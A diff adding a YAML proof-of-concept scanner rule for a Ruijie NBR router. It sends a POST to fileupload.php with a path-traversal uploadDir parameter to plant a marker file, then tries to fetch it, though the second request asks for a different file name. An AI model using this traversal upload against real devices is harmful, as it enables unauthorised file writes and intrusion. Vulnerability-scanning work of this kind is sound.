@@ -1,0 +1,19 @@
+name: poc-yaml-ruijie-nbr-ddi-upload
+rules:
+  - method: POST
+    path: /ddi/server/fileupload.php?uploadDir=../../test&name=qaxnb.txt
+    body: >-
+      qaxnb
+    follow_redirects: false
+    expression: |
+      response.body.bcontains(b'qaxnb.txt')
+  - method: GET
+    path: /test/qaxnb1.txt
+    follow_redirects: false
+    expression: |
+      response.body.bcontains(b'qaxnb')
+detail:
+  description: ruijie-nbr-ddi-upload
+  links:
+    - https://www.baidu.com
+    - http://x.x.x.x/test/qaxnb.txt
